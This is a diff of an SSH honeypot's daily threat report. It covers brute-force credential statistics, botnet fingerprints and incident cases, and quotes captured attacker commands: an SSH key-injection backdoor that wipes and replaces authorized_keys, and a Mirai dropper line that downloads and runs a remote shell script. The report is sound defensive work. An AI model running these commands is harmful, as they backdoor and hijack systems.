@@ -3,8 +3,8 @@
 | Field | Value |
 |---|---|
 | **Report Date** | 2026-11-19 |
-| **Generated At** | 2026-11-19T05:02:37Z |
-| **Shift Time** | 05:02 UTC |
+| **Generated At** | 2026-11-19T19:47:03Z |
+| **Shift Time** | 19:47 UTC |
 | **Honeypot Status** | ✅ HEALTHY |
 | **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |
 
@@ -14,15 +14,15 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Captured | **113** |
-| Confirmed Threats | **87** |
-| False Positives Filtered | **26** (23.0%) |
-| Unique Attacker IPs | **66** |
-| Countries of Origin | **24** |
-| High Severity Cases | **59** |
-| Medium Severity Cases | **1** |
-| Low Severity Cases | **53** |
-| Malware Samples Analyzed | **97** HIGH · **269** MED · 395 empty upload attempt(s) |
+| Total Sessions Captured | **493** |
+| Confirmed Threats | **423** |
+| False Positives Filtered | **70** (14.2%) |
+| Unique Attacker IPs | **198** |
+| Countries of Origin | **43** |
+| High Severity Cases | **304** |
+| Medium Severity Cases | **0** |
+| Low Severity Cases | **189** |
+| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |
 
 ---
 
@@ -30,67 +30,67 @@
 
 | Metric | Value |
 |---|---|
-| Total Auth Attempts | **963** |
-| Unique Credential Pairs | **862** |
-| Unique Usernames | **361** |
-| Unique Passwords | **636** |
-| Successful Auth Pairs | **899** |
+| Total Auth Attempts | **3339** |
+| Unique Credential Pairs | **1568** |
+| Unique Usernames | **551** |
+| Unique Passwords | **1110** |
+| Successful Auth Pairs | **3041** |
 
 **Top Usernames:**
 
 | Username | Attempts |
 |---|---|
-| `root` | 303 |
-| `ubuntu` | 39 |
-| `admin` | 32 |
-| `user` | 19 |
-| `deploy` | 16 |
+| `root` | 1259 |
+| `admin` | 138 |
+| `ubuntu` | 96 |
+| `user` | 55 |
+| `support` | 53 |
 
 **Top Passwords:**
 
 | Password | Attempts |
 |---|---|
-| `123456` | 42 |
-| `123` | 24 |
-| `1234` | 18 |
-| `root` | 18 |
-| `` | 18 |
+| `123456` | 162 |
+| `123` | 83 |
+| `root` | 77 |
+| `admin` | 69 |
+| `1234` | 67 |
 
 **Top Credential Pairs:**
 
 | Username | Password | Attempts |
 |---|---|---|
-| `rootssssss23424123123` | `rootssssss23424123123` | 15 |
-| `admin` | `admin` | 10 |
-| `root` | `root` | 8 |
-| `root` | `root3245gs5662d34111111111` | 6 |
-| `admin` | `` | 6 |
+| `rootssssss23424123123` | `rootssssss23424123123` | 53 |
+| `admin` | `admin` | 45 |
+| `root` | `root3245gs5662d34111111111` | 44 |
+| `root` | `root` | 43 |
+| `support` | `support` | 33 |
 
 **⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**
 
 | Username | Password | Source IP | Timestamp |
 |---|---|---|---|
-| `arthur` | `arthur` | `109.160.32.176` | 2026-11-19T00:00:05 |
-| `es` | `es` | `109.160.32.176` | 2026-11-19T00:00:09 |
-| `admin` | `Admin@123` | `109.160.32.176` | 2026-11-19T00:00:14 |
-| `elrond` | `elrond` | `109.160.32.176` | 2026-11-19T00:00:19 |
-| `root` | `a123456` | `109.160.32.176` | 2026-11-19T00:00:23 |
-| `root` | `tg9pitCa4Ck0` | `109.160.32.176` | 2026-11-19T00:00:28 |
-| `root` | `1234567qwertyu` | `109.160.32.176` | 2026-11-19T00:00:32 |
-| `root` | `crash` | `109.160.32.176` | 2026-11-19T00:00:37 |
-| `ben` | `ben` | `109.160.32.176` | 2026-11-19T00:00:41 |
-| `localhost` | `localhost` | `109.160.32.176` | 2026-11-19T00:00:46 |
-| `root` | `123qwe` | `109.160.32.176` | 2026-11-19T00:00:50 |
-| `root` | `Aa123123@` | `109.160.32.176` | 2026-11-19T00:00:55 |
-| `newuser` | `newuser` | `109.160.32.176` | 2026-11-19T00:00:59 |
-| `minecraft` | `1234` | `109.160.32.176` | 2026-11-19T00:01:04 |
-| `oracle` | `oracle` | `109.160.32.176` | 2026-11-19T00:01:09 |
-| `root1` | `qwe123!@` | `109.160.32.176` | 2026-11-19T00:01:13 |
-| `root` | `102030` | `109.160.32.176` | 2026-11-19T00:01:18 |
-| `root` | `s4v?_iPpN%SdhD` | `109.160.32.176` | 2026-11-19T00:01:22 |
-| `root` | `Test1234` | `109.160.32.176` | 2026-11-19T00:01:26 |
-| `admin` | `123` | `109.160.32.176` | 2026-11-19T00:01:31 |
-_… 879 more successful pair(s) in credentials.json_
+| `ha-jun` | `ha-jun` | `45.148.10.61` | 2026-11-19T02:55:52 |
+| `support` | `support` | `10.0.0.73` | 2026-11-19T02:59:55 |
+| `si-u` | `si-u` | `45.148.10.61` | 2026-11-19T03:02:06 |
+| `ubuntu` | `p@33word!@` | `93.152.221.108` | 2026-11-19T03:03:25 |
+| `root` | `www163com` | `114.217.10.60` | 2026-11-19T03:04:11 |
+| `rootssssss23424123123` | `rootssssss23424123123` | `114.217.10.60` | 2026-11-19T03:04:14 |
+| `root` | `root3245gs5662d34111111111` | `114.217.10.60` | 2026-11-19T03:04:20 |
+| `support` | `support` | `176.53.159.196` | 2026-11-19T03:07:05 |
+| `root` | `adminpass` | `130.12.181.21` | 2026-11-19T03:07:28 |
+| `do-hyeon` | `do-hyeon` | `45.148.10.61` | 2026-11-19T03:09:50 |
+| `admin` | `adminserver` | `10.0.0.73` | 2026-11-19T03:10:55 |
+| `support` | `support` | `49.131.195.158` | 2026-11-19T03:12:09 |
+| `admin` | `admin` | `77.239.124.252` | 2026-11-19T03:17:38 |
+| `tae-o` | `tae-o` | `45.148.10.61` | 2026-11-19T03:20:35 |
+| `root` | `format@123` | `14.99.116.90` | 2026-11-19T03:28:34 |
+| `rootssssss23424123123` | `rootssssss23424123123` | `14.99.116.90` | 2026-11-19T03:28:41 |
+| `root` | `root3245gs5662d34111111111` | `14.99.116.90` | 2026-11-19T03:28:49 |
+| `nginx` | `nginx` | `109.160.32.154` | 2026-11-19T03:32:24 |
+| `ubuntu` | `1qaz2wsx` | `109.160.32.154` | 2026-11-19T03:32:30 |
+| `root` | `dkflbckfd` | `109.160.32.154` | 2026-11-19T03:32:35 |
+_… 3021 more successful pair(s) in credentials.json_
 
 ---
 
@@ -98,42 +98,42 @@ _… 879 more successful pair(s) in credentials.json_
 
 | Metric | Value |
 |---|---|
-| Total Sessions Parsed | **113** |
-| Sessions with Fingerprint | **21** |
-| Unique HASSH Fingerprints | **21** |
+| Total Sessions Parsed | **493** |
+| Sessions with Fingerprint | **35** |
+| Unique HASSH Fingerprints | **35** |
 
 **Client Family Distribution:**
 
 | Client Family | Sessions |
 |---|---|
-| libssh | 30 |
-| Go SSH scanner | 26 |
-| OpenSSH | 2 |
-| Unknown | 2 |
-| Perl Net::SSH | 1 |
+| Go SSH scanner | 190 |
+| libssh | 94 |
+| OpenSSH | 12 |
+| Unknown | 4 |
+| Paramiko (Python) | 4 |
 
 **⚠️ Botnet/Scanner KEX Signatures Detected:**
 
 | HASSH | Signature | Sessions | IPs |
 |---|---|---|---|
-| `f555226df196...` | Mirai/variant | 15 | 8 |
-| `7d01d047ace6...` | Mirai/variant | 7 | 4 |
-| `a591c4ddccc9...` | Mirai/variant | 5 | 3 |
-| `2ec37a7cc8da...` | Mirai/variant | 5 | 1 |
-| `e41f883c31f1...` | Mirai/variant | 4 | 1 |
+| `2ec37a7cc8da...` | Mirai/variant | 122 | 4 |
+| `f555226df196...` | Mirai/variant | 61 | 29 |
+| `7d01d047ace6...` | Mirai/variant | 23 | 4 |
+| `a591c4ddccc9...` | Mirai/variant | 18 | 5 |
+| `eff4c24daffc...` | Modern SSH client | 8 | 1 |
 
 **Top Fingerprints:**
 
 | HASSH | Client | Sessions | IPs | Botnet Sig |
 |---|---|---|---|---|
-| `f555226df196...` | libssh | 15 | 8 | Mirai/variant |
-| `7d01d047ace6...` | Go SSH scanner | 7 | 4 | Mirai/variant |
-| `a591c4ddccc9...` | libssh | 5 | 3 | Mirai/variant |
-| `2ec37a7cc8da...` | Go SSH scanner | 5 | 1 | Mirai/variant |
-| `95420f9d932d...` | libssh | 4 | 4 | — |
-| `e41f883c31f1...` | libssh | 4 | 1 | Mirai/variant |
-| `16443846184e...` | Go SSH scanner | 4 | 3 | Generic scanner |
-| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |
+| `2ec37a7cc8da...` | Go SSH scanner | 122 | 4 | Mirai/variant |
+| `f555226df196...` | libssh | 61 | 29 | Mirai/variant |
+| `7d01d047ace6...` | Go SSH scanner | 23 | 4 | Mirai/variant |
+| `a591c4ddccc9...` | libssh | 18 | 5 | Mirai/variant |
+| `95420f9d932d...` | OpenSSH | 9 | 8 | — |
+| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
+| `f1e5e9d24e5e...` | Go SSH scanner | 7 | 1 | Mirai/variant |
+| `03a80b21afa8...` | libssh | 7 | 5 | Modern SSH client |
 
 ---
 
@@ -141,8 +141,8 @@ _… 879 more successful pair(s) in credentials.json_
 
 | Metric | Value |
 |---|---|
-| Total Command Clusters | **15** |
-| Campaign Clusters | **3** |
+| Total Command Clusters | **133** |
+| Campaign Clusters | **4** |
 | Highest Severity | **HIGH** |
 
 **Active Campaigns:**
@@ -150,7 +150,8 @@ _… 879 more successful pair(s) in credentials.json_
 | Campaign | Severity | Sessions | IPs | TTPs |
 |---|---|---|---|---|
 | **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1083, T1140, T1059.004` |
-| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 9 | `T1021.004, T1078, T1070, T1140` |
+| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1082, T1105, T1059.004` |
+| **mdrfckr SSH Key Injection** | 🔴 HIGH | 58 | 31 | `T1021.004, T1078, T1070, T1140` |
 | **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |
 
 **🔴 HIGH · Mirai/IoT Botnet**
@@ -175,6 +176,25 @@ ls /home; /bin/busybox BOTNET
 ```
 Source IPs: `160.119.66.206`
 
+**🔴 HIGH · Mirai/IoT Botnet**
+
+> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.
+
+Representative commands:
+```
+echo SHELL_TEST
+```
+```
+/bin/busybox TEST
+```
+```
+cat /proc
+```
+```
+./
+```
+Source IPs: `169.128.70.53`
+
 **🔴 HIGH · mdrfckr SSH Key Injection**
 
 > Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.
@@ -186,17 +206,7 @@ cd ~; chattr -ia .ssh; lockr -ia .ssh
 ```
 cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
 ```
-Source IPs: `179.184.242.48`, `69.5.20.205`, `103.78.1.160`, `154.92.15.197`, `114.35.59.237`, `202.165.26.170`
-
-**🔴 HIGH · Mirai/IoT Botnet**
-
-> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.
-
-Representative commands:
-```
-cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
-```
-Source IPs: `160.119.66.206`
+Source IPs: `185.227.144.174`, `160.191.244.41`, `85.95.166.40`, `123.58.219.129`, `103.189.208.13`, `67.52.95.38`
 
 ---
 
@@ -204,40 +214,329 @@ Source IPs: `160.119.66.206`
 
 | Metric | Value |
 |---|---|
-| Total IPs Analysed | **66** |
-| Unique ASNs | **31** |
-| High-Risk ASNs | **24** |
+| Total IPs Analysed | **198** |
+| Unique ASNs | **94** |
+| High-Risk ASNs | **70** |
 | Anon Infrastructure ASNs | **0** |
 
 **Top Attack ASNs:**
 
 | ASN | Provider | IPs | Risk |
 |---|---|---|---|
-| `AS0` |  | 33 | HIGH |
-| `AS3462` | Data Communication Business Group | 2 | HIGH |
-| `AS213412` | ONYPHE SAS | 2 | LOW |
-| `AS396982` | Google LLC | 2 | LOW |
-| `AS7303` | Telecom Argentina S.A. | 1 | MEDIUM |
-| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
-| `AS8560` | IONOS SE | 1 | HIGH |
-| `AS18881` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
+| `AS0` |  | 56 | HIGH |
+| `AS396982` | Google LLC | 7 | LOW |
+| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
+| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
+| `AS6939` | Hurricane Electric LLC | 6 | HIGH |
+| `AS15169` | Google LLC | 6 | HIGH |
+| `AS213412` | ONYPHE SAS | 4 | LOW |
+| `AS4766` | Korea Telecom | 4 | HIGH |
 
 ---
 
 ---
 
-## 🚨 Priority Cases — Immediate Attention (54)
+## 🚨 Priority Cases — Immediate Attention (291)
 
 > Cases with auth success, command execution, or file downloads.
 > Each requires individual review. Never grouped.
 
-### 🔴 HIGH · IR-beafee8e932d
+### 🔴 HIGH · IR-ff58152fdfa3
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `109.160.32[.]176` |
-| **First Seen** | 2026-11-19 00:00 |
-| **Last Seen** | 2026-11-19 00:00 |
+| **Source IP** | `45.148.10[.]61` |
+| **First Seen** | 2026-11-19 02:55 |
+| **Last Seen** | 2026-11-19 02:55 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 02:55:52` | `cowrie.session.connect` |
+| `2026-11-19 02:55:52` | `cowrie.client.version` |
+| `2026-11-19 02:55:52` | `cowrie.client.kex` |
+| `2026-11-19 02:55:52` | `cowrie.login.success` |
+| `2026-11-19 02:55:53` | `cowrie.session.params` |
+| `2026-11-19 02:55:53` | `cowrie.command.input` |
+| `2026-11-19 02:55:53` | `cowrie.log.closed` |
+| `2026-11-19 02:55:53` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `45.148.10[.]61` to AbuseIPDB if not already reported
+- [ ] Block `45.148.10[.]61` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-e341dae6f322
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `93.152.221[.]108` |
+| **First Seen** | 2026-11-19 03:03 |
+| **Last Seen** | 2026-11-19 03:03 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:03:24` | `cowrie.session.connect` |
+| `2026-11-19 03:03:24` | `cowrie.client.version` |
+| `2026-11-19 03:03:24` | `cowrie.client.kex` |
+| `2026-11-19 03:03:25` | `cowrie.login.success` |
+| `2026-11-19 03:03:25` | `cowrie.direct-tcpip.request` |
+| `2026-11-19 03:03:25` | `cowrie.direct-tcpip.data` |
+| `2026-11-19 03:03:25` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `93.152.221[.]108` to AbuseIPDB if not already reported
+- [ ] Block `93.152.221[.]108` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-8a5b2a26a759
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `114.217.10[.]60` |
+| **First Seen** | 2026-11-19 03:04 |
+| **Last Seen** | 2026-11-19 03:04 |
+| **Session Duration** | 10s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:04:10` | `cowrie.session.connect` |
+| `2026-11-19 03:04:10` | `cowrie.client.version` |
+| `2026-11-19 03:04:10` | `cowrie.client.kex` |
+| `2026-11-19 03:04:11` | `cowrie.login.success` |
+| `2026-11-19 03:04:12` | `cowrie.session.params` |
+| `2026-11-19 03:04:12` | `cowrie.command.input` |
+| `2026-11-19 03:04:12` | `cowrie.command.failed` |
+| `2026-11-19 03:04:12` | `cowrie.log.closed` |
+| `2026-11-19 03:04:13` | `cowrie.session.params` |
+| `2026-11-19 03:04:13` | `cowrie.command.input` |
+| `2026-11-19 03:04:13` | `cowrie.session.file_download` |
+| `2026-11-19 03:04:13` | `cowrie.log.closed` |
+| `2026-11-19 03:04:20` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `114.217.10[.]60` to AbuseIPDB if not already reported
+- [ ] Block `114.217.10[.]60` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Run Tool 31 malware analyzer on captured payload(s)
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-e41bb7dac110
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `114.217.10[.]60` |
+| **First Seen** | 2026-11-19 03:04 |
+| **Last Seen** | 2026-11-19 03:04 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:04:13` | `cowrie.session.connect` |
+| `2026-11-19 03:04:13` | `cowrie.client.version` |
+| `2026-11-19 03:04:14` | `cowrie.client.kex` |
+| `2026-11-19 03:04:14` | `cowrie.login.success` |
+| `2026-11-19 03:04:15` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `114.217.10[.]60` to AbuseIPDB if not already reported
+- [ ] Block `114.217.10[.]60` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-60636db94f76
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `176.53.159[.]196` |
+| **First Seen** | 2026-11-19 03:07 |
+| **Last Seen** | 2026-11-19 03:07 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:07:05` | `cowrie.session.connect` |
+| `2026-11-19 03:07:05` | `cowrie.client.version` |
+| `2026-11-19 03:07:05` | `cowrie.client.kex` |
+| `2026-11-19 03:07:05` | `cowrie.login.success` |
+| `2026-11-19 03:07:05` | `cowrie.direct-tcpip.request` |
+| `2026-11-19 03:07:05` | `cowrie.direct-tcpip.data` |
+| `2026-11-19 03:07:05` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
+- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-1375e5efefba
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `130.12.181[.]21` |
+| **First Seen** | 2026-11-19 03:07 |
+| **Last Seen** | 2026-11-19 03:07 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:07:27` | `cowrie.session.connect` |
+| `2026-11-19 03:07:27` | `cowrie.client.version` |
+| `2026-11-19 03:07:27` | `cowrie.client.kex` |
+| `2026-11-19 03:07:28` | `cowrie.login.success` |
+| `2026-11-19 03:07:28` | `cowrie.direct-tcpip.request` |
+| `2026-11-19 03:07:28` | `cowrie.direct-tcpip.data` |
+| `2026-11-19 03:07:28` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
+- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-9ed910a631e5
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `77.239.124[.]252` |
+| **First Seen** | 2026-11-19 03:17 |
+| **Last Seen** | 2026-11-19 03:17 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:17:37` | `cowrie.session.connect` |
+| `2026-11-19 03:17:38` | `cowrie.login.success` |
+| `2026-11-19 03:17:38` | `cowrie.session.params` |
+| `2026-11-19 03:17:38` | `cowrie.log.closed` |
+| `2026-11-19 03:17:38` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
+- [ ] Block `77.239.124[.]252` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-3fcbe5db4151
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `14.99.116[.]90` |
+| **First Seen** | 2026-11-19 03:28 |
+| **Last Seen** | 2026-11-19 03:28 |
+| **Session Duration** | 18s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:28:31` | `cowrie.session.connect` |
+| `2026-11-19 03:28:31` | `cowrie.client.version` |
+| `2026-11-19 03:28:32` | `cowrie.client.kex` |
+| `2026-11-19 03:28:34` | `cowrie.login.success` |
+| `2026-11-19 03:28:35` | `cowrie.session.params` |
+| `2026-11-19 03:28:35` | `cowrie.command.input` |
+| `2026-11-19 03:28:35` | `cowrie.command.failed` |
+| `2026-11-19 03:28:36` | `cowrie.log.closed` |
+| `2026-11-19 03:28:37` | `cowrie.session.params` |
+| `2026-11-19 03:28:37` | `cowrie.command.input` |
+| `2026-11-19 03:28:38` | `cowrie.session.file_download` |
+| `2026-11-19 03:28:38` | `cowrie.log.closed` |
+| `2026-11-19 03:28:50` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `14.99.116[.]90` to AbuseIPDB if not already reported
+- [ ] Block `14.99.116[.]90` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Run Tool 31 malware analyzer on captured payload(s)
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-64228daf4e7b
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `14.99.116[.]90` |
+| **First Seen** | 2026-11-19 03:28 |
+| **Last Seen** | 2026-11-19 03:28 |
+| **Session Duration** | 3s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 03:28:38` | `cowrie.session.connect` |
+| `2026-11-19 03:28:38` | `cowrie.client.version` |
+| `2026-11-19 03:28:39` | `cowrie.client.kex` |
+| `2026-11-19 03:28:41` | `cowrie.login.success` |
+| `2026-11-19 03:28:41` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `14.99.116[.]90` to AbuseIPDB if not already reported
+- [ ] Block `14.99.116[.]90` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-2f888e8fbb33
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `109.160.32[.]154` |
+| **First Seen** | 2026-11-19 03:32 |
+| **Last Seen** | 2026-11-19 03:32 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -248,29 +547,29 @@ Source IPs: `160.119.66.206`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 00:00:04` | `cowrie.session.connect` |
-| `2026-11-19 00:00:04` | `cowrie.client.version` |
-| `2026-11-19 00:00:04` | `cowrie.client.kex` |
-| `2026-11-19 00:00:05` | `cowrie.login.success` |
-| `2026-11-19 00:00:05` | `cowrie.session.params` |
-| `2026-11-19 00:00:05` | `cowrie.command.input` |
-| `2026-11-19 00:00:06` | `cowrie.log.closed` |
-| `2026-11-19 00:00:06` | `cowrie.session.closed` |
+| `2026-11-19 03:32:24` | `cowrie.session.connect` |
+| `2026-11-19 03:32:24` | `cowrie.client.version` |
+| `2026-11-19 03:32:24` | `cowrie.client.kex` |
+| `2026-11-19 03:32:24` | `cowrie.login.success` |
+| `2026-11-19 03:32:25` | `cowrie.session.params` |
+| `2026-11-19 03:32:25` | `cowrie.command.input` |
+| `2026-11-19 03:32:25` | `cowrie.log.closed` |
+| `2026-11-19 03:32:25` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `109.160.32[.]176` to AbuseIPDB if not already reported
-- [ ] Block `109.160.32[.]176` at perimeter firewall / security group
+- [ ] Submit `109.160.32[.]154` to AbuseIPDB if not already reported
+- [ ] Block `109.160.32[.]154` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-8c5cbb96325d
+### 🔴 HIGH · IR-f788a89aa59a
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `93.152.221[.]51` |
-| **First Seen** | 2026-11-19 00:02 |
-| **Last Seen** | 2026-11-19 00:02 |
-| **Session Duration** | 0s |
+| **First Seen** | 2026-11-19 03:45 |
+| **Last Seen** | 2026-11-19 03:45 |
+| **Session Duration** | 1s |
 | **Login Attempts** | 1 |
